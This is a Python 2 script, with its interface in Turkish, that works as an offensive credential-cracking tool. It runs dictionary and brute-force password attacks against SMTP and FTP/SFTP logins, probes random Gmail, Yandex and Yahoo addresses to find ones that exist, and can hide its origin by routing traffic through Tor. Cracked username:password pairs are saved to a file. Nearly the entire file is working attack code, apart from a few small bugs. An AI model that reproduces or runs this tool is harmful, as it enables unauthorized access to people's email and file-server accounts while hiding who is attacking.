#!/usr/bin/python2
#-*- coding:utf-8-*-

class renkler:
    ResetAll = "\033[0m"

    Bold       = "\033[1m"
    Dim        = "\033[2m"
    Underlined = "\033[4m"
    Blink      = "\033[5m"
    Reverse    = "\033[7m"
    Hidden     = "\033[8m"

    ResetBold       = "\033[21m"
    ResetDim        = "\033[22m"
    ResetUnderlined = "\033[24m"
    ResetBlink      = "\033[25m"
    ResetReverse    = "\033[27m"
    ResetHidden     = "\033[28m"

    Default      = "\033[39m"
    Black        = "\033[30m"
    Red          = "\033[31m"
    Green        = "\033[32m"
    Yellow       = "\033[33m"
    Blue         = "\033[34m"
    Magenta      = "\033[35m"
    Cyan         = "\033[36m"
    LightGray    = "\033[37m"
    DarkGray     = "\033[90m"
    LightRed     = "\033[91m"
    LightGreen   = "\033[92m"
    LightYellow  = "\033[93m"
    LightBlue    = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan    = "\033[96m"
    White        = "\033[97m"

    BackgroundDefault      = "\033[49m"
    BackgroundBlack        = "\033[40m"
    BackgroundRed          = "\033[41m"
    BackgroundGreen        = "\033[42m"
    BackgroundYellow       = "\0[33[43m"
    BackgroundBlue         = "\033[44m"
    BackgroundMagenta      = "\033[45m"
    BackgroundCyan         = "\033[46m"
    BackgroundLightGray    = "\033[47m"
    BackgroundDarkGray     = "\033[100m"
    BackgroundLightRed     = "\033[101m"
    BackgroundLightGreen   = "\033[102m"
    BackgroundLightYellow  = "\033[103m"
    BackgroundLightBlue    = "\033[104m"
    BackgroundLightMagenta = "\033[105m"
    BackgroundLightCyan    = "\033[106m"
    BackgroundWhite        = "\033[107m"
    #https://godoc.org/github.com/whitedevops/colors
try:
    from validate_email import validate_email
    import random
    import string
    import smtplib
    import ftplib
    import socket
    import DNS
    import socks
    import requests
    import pysftp
    import argparse
    import os
    import time
    import datetime
except ImportError as bul:
    print(renkler.Red + bul +renkler.ResetAll)
    exit()
kullanim = "-y , --yardim" + renkler.Cyan + " Yardım menüsü" +renkler.ResetAll
kullanim += "\n--smtp , -s [SMTP ADRESİ]" + renkler.Cyan + " Hedef smtp adressi ör: --smtp"+renkler.Red+ " smtp.gmail.com"+renkler.ResetAll
kullanim += "\n--ftp , -f [FTP ADRESİ]" + renkler.Cyan + " Hedef ftp adressi ör: --ftp" + renkler.Red+ " ftp.site.com"+renkler.ResetAll
kullanim += "\n--port , -p [PORT]" + renkler.Cyan + " Hedef port ör: --port" + renkler.Red+" 21"+renkler.ResetAll
kullanim += "\n--ssl , -S" + renkler.Cyan + " Hedef" +renkler.Red + " SSL " + renkler.Cyan+"kullanıyorsa bu seçeneği aktif edin"+renkler.ResetAll
kullanim += "\n--tls , -T" + renkler.Cyan + " Hedef" + renkler.Red + " TLS " + renkler.Cyan+"kullanıyorsa bu seçeneği aktif edin"+renkler.ResetAll
kullanim += "\n--isim , -i [İSİM]" + renkler.Cyan + " Hedef kullanıcı adı veya mail adressi ör: --isim"+renkler.Red+ " mail@mail.com"+renkler.ResetAll
kullanim += "\n--kelime , -k [ŞİFRE LİSTESİ]" + renkler.Cyan + " Şifre listesi ör: --kelime"+renkler.Red+ " /../../şifre.txt"+renkler.ResetAll
kullanim += "\n--sozluksaldirisi , -sz" + renkler.Cyan + " Sözlük saldırısı gerçekleştirir."+renkler.ResetAll
kullanim += "\n--kabakuvvet , -kk" + renkler.Cyan + " Kaba kuvvet saldırısı gerçekleştirir."+renkler.ResetAll
kullanim += "\n--bul_kabakuvvet , -bk" + renkler.Cyan + " Kaba kuvvet yöntemi ile kullanıcı adı / mail adresi var olup olmadığını bulur."+renkler.Red+"(SMTP İÇİN GEÇERLİDİR)"+renkler.ResetAll
kullanim += "\n--bul_kelime , -bK" + renkler.Cyan + " Girilen mail/kullanıcı var olup olmadığını bulmaya çalışır."+renkler.Red+"(SMTP İÇİN GEÇERLİDİR)"+renkler.ResetAll
kullanim += "\n--bul_liste , -bL" + renkler.Cyan + " Girilen mail/kullanıcı var olup olmadığını bulmaya çalışır."+renkler.Red+"(SMTP İÇİN GEÇERLİDİR)"+renkler.ResetAll
kullanim += "\n--kayitet , -K [KAYIT EDİLİCEK DOSYA ADI]" + renkler.Cyan + " Sonuçları otomatik olarak kayıt eder ör:--kayitet" + renkler.Red+" sonuç.txt" +renkler.ResetAll
kullanim += "\n--torhttp , -th " +renkler.Cyan + "Tor proxy" + renkler.Red + " HTTP" + renkler.Cyan+" tüneli üzerinden başlatılır" + renkler.ResetAll
kullanim += "\n--torsocks4 , -t4 " +renkler.Cyan + "Tor proxy" + renkler.Red + " SOCKS4" + renkler.Cyan+" tüneli üzerinden başlatılır" + renkler.ResetAll
kullanim += "\n--torsocks5 , -t5 " +renkler.Cyan + "Tor proxy" + renkler.Red + " SOCKS5" + renkler.Cyan+" tüneli üzerinden başlatılır" + renkler.ResetAll
parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('--yardim','-y', action='store_true')
parser.add_argument('--smtp','-s')
parser.add_argument('--ftp','-f')
parser.add_argument('--port','-p', type=int)
parser.add_argument('--ssl','-S', action='store_true')
parser.add_argument('--tls','-T', action='store_true')
parser.add_argument('--isim','-i')
parser.add_argument('--kelime','-k')
parser.add_argument('--sozluksaldirisi','-sz', action='store_true')
parser.add_argument('--kabakuvvet','-kk', action='store_true')
parser.add_argument('--bul_kabakuvvet','-bk', action='store_true')
parser.add_argument('--bul_kelime','-bK',)
parser.add_argument('--bul_liste','-bL')
parser.add_argument('--kayitet','-K')
parser.add_argument('--torhttp','-th', action='store_true')
parser.add_argument('--torsocks4','-t4', action='store_true')
parser.add_argument('--torsocks5','-t5', action='store_true')
args = parser.parse_args()
 
def tor():
    if(args.torhttp):
        try:
            print(renkler.Magenta+"Tor ağına bağlanıyor..."+renkler.ResetAll)
            socks.set_default_proxy(socks.PROXY_TYPE_HTTP,'127.0.0.1',9080,True)
            socket.socket = socks.socksocket
            print(renkler.BackgroundBlue+renkler.White+"Tor proxy:"+renkler.ResetAll+renkler.LightCyan+requests.get('https://api.ipify.org/?format=json%27').text+renkler.ResetAll)
        except:
            print(renkler.Red+"Tor ağına bağlanamadı.")
            print("Tor servisin aktif olduğundan emin olun.")
            print("HTTP tünneli 9080 port üzerinden çalışır olduğundan emin olun"+renkler.ResetAll)
            exit()
    elif(args.torsocks4):
        try:
            print(renkler.Magenta+"Tor ağına bağlanıyor..."+renkler.ResetAll)
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4,'127.0.0.1',9050,True)
            socket.socket = socks.socksocket
            print(renkler.BackgroundBlue+renkler.White+"Tor proxy:"+renkler.ResetAll+renkler.LightCyan+requests.get('https://api.ipify.org/?format=json%27').text+renkler.ResetAll)
        except:
            print(renkler.Red+"Tor ağına bağlanamadı.")
            print("Tor servisin aktif olduğundan emin olun.")
            print("SOCKS4 tünneli 9050 port üzerinden çalışır olduğundan emin olun"+renkler.ResetAll)
            exit()  
    elif(args.torsocks5):
        try:
            print(renkler.Magenta+"Tor ağına bağlanıyor..."+renkler.ResetAll)
            socks.set_default_proxy(socks.PROXY_TYPE_HTTP,'127.0.0.1',9050,True)
            socket.socket = socks.socksocket
            print(renkler.BackgroundBlue+renkler.White+"Tor proxy:"+renkler.ResetAll+renkler.LightCyan+requests.get('https://api.ipify.org/?format=json%27').text+renkler.ResetAll)
        except:
            print(renkler.Red+"Tor ağına bağlanamadı.")
            print("Tor servisin aktif olduğundan emin olun.")
            print("SOCKS5 tünneli 9050 port üzerinden çalışır olduğundan emin olun"+renkler.ResetAll)
            exit()
    else:
        pass
def smtp_kbul():
    if(args.kayitet):
        soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:
""")
        if(soru == "1" or soru == "2" or soru == "3"):
            pass
        else:
            print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
            exit()
        kod = validate_email(args.bul_kelime,verify=True)
        if(kod == True):
            print(renkler.Magenta+"["+renkler.Red+"+"+renkler.Magenta+"]"+renkler.Green+args.bul_kelime)
            if(soru != "2"):
               open(args.kayitet,"a").write("[+]"+args.bul_kelime+os.linesep)
        else:
            print(renkler.Magenta+"["+renkler.Red+"-"+renkler.Magenta+"]"+renkler.Red+args.bul_kelime)
            if(soru == "3" or soru == "2"):
                open(args.kayitet,"a").write("[-]"+args.bul_kelime+os.linesep)
    else:
        kod = validate_email(args.bul_kelime,verify=True)
        if(kod == True):
            print(renkler.Magenta+"["+renkler.Red+"+"+renkler.Magenta+"]"+renkler.Green+args.bul_kelime)
        else:
            print(renkler.Magenta+"["+renkler.Red+"-"+renkler.Magenta+"]"+renkler.Red+args.bul_kelime)

def smtp_kbulkabakuvvet():
    try:
        min_ = input("Oluşturulucak minimum mail uzunluğu:")
    except:
            print(renkler.Red+"Geçerli değer girilmedi."+renkler.ResetAll)
            exit()
    try:
        enfazla_ = input("Oluşuturulucak en fazla mail uzunluğu:")
    except:
        print(renkler.Red+"Geçerli değer girilmedi."+renkler.ResetAll)
        exit()
    print(renkler.Dim+"%s:%s"+renkler.Magenta+" aralığında mail oluşturulucak."+renkler.ResetAll)%(min_,enfazla_)
    metinler = "1)Sadece küçük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
    metinler += "2)Sadece büyük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
    metinler += "3)Sadece küçük,büyük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
    metinler += "4)Sadece sayılar"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
    metinler += "5)Küçük,büyük,sayılar"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
    metinler += "6)Özel"
    print(metinler)
    metinler = raw_input("Oluşturulucak karakter method'unu giriniz:")
    if(metinler == "1"):
                karakter = string.ascii_lowercase
    elif(metinler == "2"):
                karakter = string.ascii_uppercase
    elif(metinler == "3"):
                karakter = string.ascii_lowercase + string.ascii_uppercase
    elif(metinler == "4"):
                karakter = "0123456879"
    elif(metinler == "5"):
                karakter = string.ascii_lowercase + string.ascii_uppercase + "1234567890"
    elif(metinler == "6"):
                karakter = raw_input("Karakterleri giriniz:")
    else:
        print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
        exit()
    print("""1)@gmail.com
2)@yandex.com
3)@yahoo.com
4)Özel""")
    et = raw_input("Seçiniz:")
    if(et == "1"):
        et = "@gmail.com"
    elif(et == "2"):
        et = "@yandex.com"
    elif(et == "3"):
        et = "@yahoo.com"
    elif(et == "4"):
        et = raw_input("Giriniz:")
    else:
        print(renkler.Red+"Yanlış değer girildi."+renkler.ResetAll)
        exit()
        if(args.kayitet):
            soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:""")
    while True:
        if(args.kayitet):
            if(min_ != enfazla_):
                uzunluk = random.randint(min_,enfazla_)
            else:
                uzunluk = min_
            mail_adress = ''.join(random.choice(karakter)for x in range(uzunluk))
            mail_adress += et
            kod = validate_email(mail_adress,verify=True)
            if(kod == True):
                print(renkler.Magenta+"["+renkler.Red+"+"+renkler.Magenta+"]"+renkler.Green+mail_adress)
                if(soru != "2"):
                    open(args.kayitet,"a").write("[+]"+mail_adress+os.linesep)
            else:
                print(renkler.Magenta+"["+renkler.Red+"-"+renkler.Magenta+"]"+renkler.Red+mail_adress)
                if(soru == "3" or soru == "2"):
                    open(args.kayitet,"a").write("[-]"+mail_adress+os.linesep)
        else:
            uzunluk = random.randint(min_,enfazla_)
            mail_adress = ''.join(random.choice(karakter)for x in range(uzunluk))
            mail_adress = mail_adress + et
            kod = validate_email(mail_adress,verify=True)
            if(kod == True):
                print(renkler.Magenta+"["+renkler.Green+"+"+renkler.Magenta+"]"+renkler.Green+mail_adress)
            else:
                print(renkler.Magenta+"["+renkler.Red+"-"+renkler.Magenta+"]"+renkler.Red+mail_adress)
def bul_liste():
    if(args.kayitet):
        soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:""")
        if(soru == "1" or soru == "2" or soru == "3"):
            pass
        else:
            print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
            exit()
        for bul in open(args.bul_liste,'r'):
            kod = validate_email(bul,verify=True)
            if(kod == True):
                if(soru != "2"):
                    open(args.kayitet,'r').write("[+]"+bul+os.linesep)

                print(renkler.Magenta+"["+renkler.Green+"+"+renkler.Magenta+"]"+renkler.Green+bul)
            else:
                if(soru == "2" or soru == "3"):
                    open(args.kayitet,'r').write("[-]"+bul+os.linesep)
                print(renkler.Magenta+"["+renkler.Red+"-"+renkler.Magenta+"]"+renkler.Red+bul)
    else:
        for bul in open(args.bul_liste,'r'):
            kod = validate_email(bul,verify=True)
            if(kod == True):
                print(renkler.Magenta+"["+renkler.Green+"+"+renkler.Magenta+"]"+renkler.Green+bul)
            else:
                print(renkler.Magenta+"["+renkler.Red+"-"+renkler.Magenta+"]"+renkler.Red+bul)
def smtp():
    if(args.port):
        if(args.ssl):
            try:
                print(renkler.Magenta+"%s:%d bağlanılmaya çalışıyor..."+renkler.ResetAll)%(args.smtp,args.port)
                s = smtplib.SMTP_SSL(host=args.smtp,port=args.port)
                print(renkler.LightCyan+"%s:%d bağlantı kuruldu"+renkler.ResetAll)%(args.smtp,args.port)
            except:
                print(renkler.Red+"Bağalantı başarısız."+renkler.ResetAll)
                exit()
        elif(args.tls):
            print(renkler.Magenta+"%s:%d bağlanılmaya çalışıyor..."+renkler.ResetAll)%(args.smtp,args.port)
            s = smtplib.SMTP(host=args.smtp,port=args.port)
            s.starttls()
            print(renkler.LightCyan+"%s:%d bağlantı kuruldu"+renkler.ResetAll)%(args.smtp,args.port)
        else:
            print(renkler.Magenta+"%s:%d bağlanılmaya çalışıyor..."+renkler.ResetAll)%(args.smtp,args.port)
            s = smtplib.SMTP(host=args.smtp,port=args.port)
            print(renkler.LightCyan+"%s:%d bağlantı kuruldu"+renkler.ResetAll)%(args.smtp,args.port)
    else:
        print(renkler.Red+"Port değeri girilmemiş."+renkler.ResetAll)
        exit()
    if(args.isim):
        if(args.sozluksaldirisi):
         if(args.kelime):
            if(args.kayitet):
                soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:
""")

                print(renkler.BackgroundBlue +renkler.White+ "Kayıt etme modu aktif." + renkler.ResetAll)
                if(soru == "1" or soru == "2" or soru == "3"):
                    pass
                else:
                    print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
                    exit()
                say = 0
                for giris in open(args.kelime,'r'):
                    try:
                        s.login(args.isim,giris)
                        say += 1
                        if(soru !="2"):
                            open(args.kayitet,"a").write("BAŞARILI("+str(datetime.datetime.now())+")"+":"+args.isim+":"+giris+os.linesep)
                        print(renkler.Magenta+"["+renkler.Green+str(say)+renkler.Magenta+"]"+renkler.Green+args.isim+":"+giris+renkler.ResetAll)
                        s.close()
                    except smtplib.SMTPAuthenticationError:
                        say += 1
                        print(renkler.Magenta+"["+renkler.Red+str(say)+renkler.Magenta+"]"+renkler.Red+args.isim+":"+giris+renkler.ResetAll)
                        if(soru == "2" or soru == "3"):
                            open(args.kayitet,"a").write("Kırılmadı("+str(str(datetime.datetime.now()))+")"+":"+args.isim+":"+giris+os.linesep)
                    except smtplib.SMTPServerDisconnected:
                        print(renkler.Magenta+"Sunucu tarafından bağlantı kesildi\n30 Saniye içinde tekrar bağlantı kurulucak"+renkler.ResetAll)
                        time.sleep(30)
            else:
                say = 0 
                print(renkler.BackgroundBlack +renkler.Red+ "Kayıt etme modu deaktif." + renkler.ResetAll)
                for giris in open(args.kelime,'r'):
                    say += 1 
                    try:
                        s.login(args.isim,giris)
                        print(renkler.Magenta+"["+renkler.Green+str(say)+renkler.Magenta+"]"+renkler.Green+args.isim+":"+giris+renkler.ResetAll)
                        s.close()
                    except smtplib.SMTPAuthenticationError:
                        print(renkler.Magenta+"["+renkler.Red+str(say)+renkler.Magenta+"]"+renkler.Red+args.isim+":"+giris+renkler.ResetAll)
                    except smtplib.SMTPServerDisconnected:
                        print(renkler.Magenta+"Sunucu tarafından bağlantı kesildi\n30 Saniye içinde tekrar bağlantı kurulucak"+renkler.ResetAll)
                        time.sleep(30)
         else:
               print(renkler.Red+"Şifre listesi belirtilmemiş."+renkler.ResetAll)   
        elif(args.kabakuvvet):
            try:
                min_ = input("Oluşturulucak minimum şifre uzunluğu:")
            except:
                print(renkler.Red+"Geçerli değer girilmedi."+renkler.ResetAll)
                exit()
            try:
                enfazla_ = input("Oluşuturulucak en fazla şifre uzunluğu:")
            except:
                print(renkler.Red+"Geçerli değer girilmedi."+renkler.ResetAll)
                exit()
            print(renkler.Dim+"%s:%s"+renkler.Magenta+" aralığında şifre oluşturulucak."+renkler.ResetAll)%(min_,enfazla_)
            metinler = "1)Sadece küçük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "2)Sadece büyük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "3)Sadece küçük-büyük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "4)Sadece sayılar"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "5)Küçük,büyük,sayılar"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "6)Özel"
            print(metinler)
            metinler = raw_input("Oluşturulucak şifre method'unu giriniz:")
            if(metinler == "1"):
                karakter = string.ascii_lowercase
            elif(metinler == "2"):
                karakter = string.ascii_uppercase
            elif(metinler == "3"):
                karakter = string.ascii_lowercase + string.uppercase
            elif(metinler == "4"):
                karakter = "0123456879"
            elif(metinler == "5"):
                karakter = string.ascii_lowercase + string.ascii_uppercase + "1234567890"
            elif(metinler == "6"):
                karakter = raw_input("Karakterleri giriniz:")
            else:
                print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
                exit()
            if(args.ssl):
                s = smtplib.SMTP_SSL(host=args.smtp,port=args.port)
            elif(args.tls):
                s = smtplib.SMTP(host=args.smtp,port=args.port)
                s.starttls()
            else:
                s = smtplib.SMTP(host=args.smtp,port=args.port)
            if(args.kayitet):
                soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:
""")
                if(soru == "1" or soru == "2" or soru == "3"):
                    pass
                else:
                    print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
                    exit()
                print(renkler.BackgroundBlue +renkler.White+ "Kayıt etme modu aktif." + renkler.ResetAll)
                say = 0
                while True:
                    try:
                        if(min_ != enfazla_):
                            uzunluk = random.randint(min_,enfazla_)
                        else:
                            uzunluk = min_
                        giris = ''.join(random.choice(karakter)for x in range(uzunluk))
                        say += 1
                        s.login(args.isim,giris)
                        if(soru != "2"):
                            open(args.kayitet,"a").write("BAŞARILI("+str(datetime.datetime.now())+")"+":"+args.isim+":"+giris+os.linesep)
                        print(renkler.Magenta+"["+renkler.Green+str(say)+renkler.Magenta+"]"+renkler.Green+args.isim+":"+giris+renkler.ResetAll)
                        break
                    except smtplib.SMTPAuthenticationError:
                        say += 1
                        print(renkler.Magenta+"["+renkler.Red+str(say)+renkler.Magenta+"]"+renkler.Red+args.isim+":"+giris+renkler.ResetAll)
                        if(soru == "2" or soru=="3"):
                            open(args.kayitet,"a").write("Kırılmadı("+str(datetime.datetime.now())+")"+":"+args.isim+":"+giris+os.linesep)
                    except smtplib.SMTPServerDisconnected:
                        print(renkler.Magenta+"Sunucu tarafından bağlantı kesildi\n30 Saniye içinde tekrar bağlantı kurulucak"+renkler.ResetAll)
                        time.sleep(30)
            else:
                print(renkler.BackgroundBlack +renkler.Red+ "Kayıt etme modu deaktif." + renkler.ResetAll)
                while True:
                    try:
                        uzunluk = random.randint(min_,enfazla_)
                        giris = ''.join(random.choice(karakter)for x in range(uzunluk))
                        s.login(args.isim,giris)
                        say += 1
                        print(renkler.Magenta+"["+renkler.Green+str(say)+renkler.Magenta+"]"+renkler.Green+args.isim+":"+giris+renkler.ResetAll)
                        break
                    except smtplib.SMTPAuthenticationError:
                        say += 1
                        print(renkler.Magenta+"["+renkler.Red+str(say)+renkler.Magenta+"]"+renkler.Red+args.isim+":"+giris+renkler.ResetAll)
                    except smtplib.SMTPServerDisconnected:
                        print(renkler.Magenta+"Sunucu tarafından bağlantı kesildi\n30 Saniye içinde tekrar bağlantı kurulucak"+renkler.ResetAll)
                        time.sleep(30)
        else:
            print(renkler.Red + "Her hangi bir method(--sozluksaldirisi,--kabakuvvet) girilmemiş.")
def ftp():
    if(args.tls):
        ftp = ftplib.FTP_TLS()
    elif(args.ssl):
        pass
    else:
        ftp = ftplib.FTP()
    if(args.port):
        if(args.sozluksaldirisi):
            if(args.kelime):
                say = 0
                if(args.kayitet):
                    soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:
""")
                for sifre in open(args.kelime,'r'):
                    try:
                        if(args.ssl):
                            ftps  = pysftp.Connection(args.ftp,args.isim,sifre)
                        else:
                            ftp.connect(args.ftp,args.port,args.isim,sifre)
                        say += 1  
                        if(args.kayitet):
                            if(soru != "2"):
                                open(args.kayitet,'a').write("Başarılı("+str(datetime.datetime.now()) +")" + args.isim + ":" + sifre + os.linesep)
                        print(renkler.Magenta+"["+renkler.Green+str(say)+renkler.Magenta+"]"+renkler.Green+args.isim+":"+sifre+renkler.ResetAll)
                        if(args.ssl):
                            exit()
                        else:
                            ftp.quit()
                    except:
                        say += 1
                        if(args.kayitet):
                            if(soru == "2" or soru =="3"):
                                open(args.kayitet,'a').write("Başarısız("+str(datetime.datetime.now()) +")" + args.isim + ":" + sifre + os.linesep)
                        print(renkler.Magenta+"["+renkler.Red+str(say)+renkler.Magenta+"]"+renkler.Red+args.isim+":"+sifre+renkler.ResetAll)
            else:
                print(renkler.Red+"Şifre listesi girilmemiş."+renkler.ResetAll)
        elif(args.kabakuvvet):
            try:
                min_ = input("Oluşturulucak minimum şifre uzunluğu:")
            except:
                print(renkler.Red+"Geçerli değer girilmedi."+renkler.ResetAll)
                exit()
            try:
                enfazla_ = input("Oluşuturulucak en fazla şifre uzunluğu:")
            except:
                print(renkler.Red+"Geçerli değer girilmedi."+renkler.ResetAll)
                exit()
            print(renkler.Dim+"%s:%s"+renkler.Magenta+" aralığında şifre oluşturulucak."+renkler.ResetAll)%(min_,enfazla_)
            metinler = "1)Sadece küçük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "2)Sadece büyük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "3)Sadece küçük-büyük harfler"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "4)Sadece sayılar"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "5)Küçük,büyük,sayılar"+renkler.Red+"(Türkçe karakterler yok)\n"+renkler.ResetAll
            metinler += "6)Özel"
            print(metinler)
            metinler = raw_input("Oluşturulucak şifre method'unu giriniz:")
            if(metinler == "1"):
                karakter = string.ascii_lowercase
            elif(metinler == "2"):
                karakter = string.ascii_uppercase
            elif(metinler == "3"):
                karakter = string.ascii_lowercase + string.uppercase
            elif(metinler == "4"):
                karakter = "0123456879"
            elif(metinler == "5"):
                karakter = string.ascii_lowercase + string.ascii_uppercase + "1234567890"
            elif(metinler == "6"):
                karakter = raw_input("Karakterleri giriniz:")
            else:
                print(renkler.Red+"Yanlış seçenek girildi."+renkler.ResetAll)
                exit()
            if(args.tls):
                ftp = ftplib.FTP_TLS()
            elif(args.ssl):
                pass
            else:
                ftp = ftplib.FTP()
            if(args.kayitet):
                soru = raw_input("""1)Sadece başarılı sonuçları kayıt et
2)Sadece başarısız sonuçları kayıt et
3)Her iksinide kayıt et
Şuna göre kayıt et:
""")
            say = 0
            while True:
                uzunluk = random.randint(min_,enfazla_)
                sifre = ''.join(random.choice(karakter) for x in range(uzunluk))
                try:
                    if(args.ssl):
                        ftps  = pysftp.Connection(args.ftp, args.isim,sifre)
                    elif(args.tls):
                        ftp.connect(args.ftp,args.port,args.isim,sifre)
                    else:
                        ftp.connect(args.ftp,args.port,args.isim,sifre)
                    say += 1  
                    if(args.kayitet):
                        if(soru != "2"):
                            open(args.kayitet,'a').write("Başarılı("+str(datetime.datetime.now()) +")" + args.isim + ":" + sifre + os.linesep)
                    print(renkler.Magenta+"["+renkler.Green+str(say)+renkler.Magenta+"]"+renkler.Green+args.isim+":"+sifre+renkler.ResetAll)
                    if(args.ssl):
                        exit()
                    else:
                        ftp.quit()
                except:
                    say += 1
                    if(args.kayitet):
                        if(soru == "2" or soru =="3"):
                            open(args.kayitet,'a').write("Başarısız("+str(datetime.datetime.now()) +")" + args.isim + ":" + sifre + os.linesep)
                    print(renkler.Magenta+"["+renkler.Red+str(say)+renkler.Magenta+"]"+renkler.Red+args.isim+":"+sifre+renkler.ResetAll)
    else:
        print(renkler.Red+"Port değeri girilmemiş."+renkler.ResetAll)
def yapilandir():
    if(args.bul_kelime):
        try:
            smtp_kbul()
        except DNS.Base.SocketError:
            print(renkler.Red+"Bu method da sadece socks5 kullanıla bilir")
            exit()
    if(args.bul_kabakuvvet):
        try:
            smtp_kbulkabakuvvet()
        except DNS.Base.SocketError:
            print(renkler.Red+"Bu method da sadece socks5 kullanıla bilir")
            exit()
    if(args.smtp):
        smtp()
    if(args.ftp):
        ftp()
def main():
    if(args.yardim):
        print(kullanim)
    tor()
    yapilandir()
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n")
        exit()
